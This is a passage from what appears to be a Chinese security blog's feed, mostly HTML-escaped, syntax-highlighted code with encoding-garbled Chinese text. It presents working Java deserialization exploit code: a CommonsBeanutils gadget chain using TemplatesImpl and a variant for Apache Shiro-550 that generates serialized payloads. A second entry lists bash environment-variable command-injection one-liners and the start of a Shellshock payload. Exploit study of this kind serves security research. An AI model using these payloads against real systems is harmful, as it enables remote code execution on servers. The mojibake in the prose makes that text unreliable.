&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">evil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EvilTemplatesImpl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()).&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;property&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">ois&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ois&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="shiro-550æ— cc">Shiro-550(æ— cc&lt;/h3>
&lt;p>shiroæœ¬èº«çš„ä¾èµ–æ˜¯æœ‰cbçš„ï¼Œä½†æ˜¯ä¼šå› ä¸ºserialVersionUIDä¸ç¬¦è€ŒæŠ¥é”™ï¼Œå³ä½¿æˆ‘ä»¬è°ƒå¯¹ç”Ÿæˆpayloadçš„æœ¬åœ°ä¾èµ–ç‰ˆæœ¬å’Œç›®æ ‡ç¯å¢ƒä¸€è‡´ä¹Ÿä¼šå‡ºç°ccä¾èµ–ç‰ˆæœ¬ä¸å¯¹çš„æƒ…å†µï¼Œæˆ‘ä»¬è®¾æƒ³ä¸€æ¡æ— ä¾èµ–çš„Shiroååºåˆ—åŒ–åˆ©ç”¨é“¾&lt;/p>
&lt;p>åœ¨BeanComparatorçš„æ„é€ å‡½æ•°å¤„ï¼Œæ²¡æœ‰æ˜¾å¼ä¼ å…¥Comparatoræ—¶é»˜è®¤ä½¿ç”¨ccä¸­çš„ComparableComparatorï¼Œæ›¿ä»£ç±»éœ€è¦æ»¡è¶³è¿™æ ·çš„æ¡ä»¶ï¼š&lt;/p>
&lt;ul>
&lt;li>å®ç°java.util.Comparatoræ¥å£&lt;/li>
&lt;li>å®ç°java.io.Serializableæ¥å£&lt;/li>
&lt;li>æœ€å¥½è‡ªå¸¦ï¼Œå…¼å®¹æ€§å¼º&lt;/li>
&lt;/ul>
&lt;p>æˆ‘ä»¬æ‰¾åˆ°äº†java.util.Stringä¸­çš„å†…éƒ¨ç§æœ‰ç±»CaseInsesitiveComparatorï¼Œå®ƒå®ç°äº†Comparatorå’ŒSerializable&lt;/p>
&lt;p>æ›¿æ¢exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.beanutils.BeanComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CommonsBeanutils1Shiro&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">clazzBytes&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">clazzBytes&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;HelloTemplatesImpl&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_tfactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformerFactoryImpl&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BeanComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">CASE_INSENSITIVE_ORDER&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// stub data for replacement later
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;1&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;property&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;outputProperties&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;queue&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ==================
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toByteArray&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>ç¯å¢ƒå˜é‡ç›¸å…³é—®é¢˜</title><link>https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/</link><pubDate>Wed, 23 Mar 2022 18:33:39 +0800</pubDate><guid>https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/</guid><description>&lt;h2 id="æ™®é€šç¯å¢ƒå˜é‡">æ™®é€šç¯å¢ƒå˜é‡&lt;/h2>
&lt;p>&lt;a href="https://tttang.com/archive/1450/">æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ENV&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;$(id 1&amp;gt;&amp;amp;2)&amp;#39;&lt;/span> dash -i -c &lt;span style="color:#d88200">&amp;#39;echo hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">BASH_ENV&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;$(id 1&amp;gt;&amp;amp;2)&amp;#39;&lt;/span> bash -c &lt;span style="color:#d88200">&amp;#39;echo hello&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ENV&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;$(id 1&amp;gt;&amp;amp;2)&amp;#39;&lt;/span> sh -i -c &lt;span style="color:#d88200">&amp;#34;echo hello&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">PROMPT_COMMAND&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span> bash &lt;span style="color:#75715e"># æ‰§è¡Œå‘½ä»¤åç»™å‡ºäº¤äº’shell debianæ— &lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env &lt;span style="color:#d88200">$&amp;#39;BASH_FUNC_echo%%=() { id; }&amp;#39;&lt;/span> bash -c &lt;span style="color:#d88200">&amp;#39;echo hello&amp;#39;&lt;/span> &lt;span style="color:#75715e"># bash 4.4åŠä»¥å&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>env &lt;span style="color:#d88200">$&amp;#39;BASH_FUNC_echo()=() { id; }&amp;#39;&lt;/span> bash -c &lt;span style="color:#d88200">&amp;#34;echo hello&amp;#34;&lt;/span> &lt;span style="color:#75715e"># bash 4.4ä»¥å‰&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="shellshock--cve-2014-6271">ShellShock / CVE-2014-6271&lt;/h3>
&lt;p>&lt;a href="https://wooyun.js.org/drops/Shellshock%E6%BC%8F%E6%B4%9E%E5%9B%9E%E9%A1%BE%E4%B8%8E%E5%88%86%E6%9E%90%E6%B5%8B%E8%AF%95.html">ShellShockæ¼æ´å›é¡¾ä¸åˆ†ææµ‹è¯•&lt;/a> | &lt;a href="https://github.com/vulhub/vulhub/blob/master/bash/shellshock/README.zh-cn.md">å¤ç° - vulhub&lt;/a>&lt;/p>
&lt;p>åº”ç”¨äºbash 4.3åŠä»¥å‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ env &lt;span style="color:#111">TEST&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;() { :; };&amp;#39;&lt;/span> id&lt;span style="color:#111">;&lt;/span>
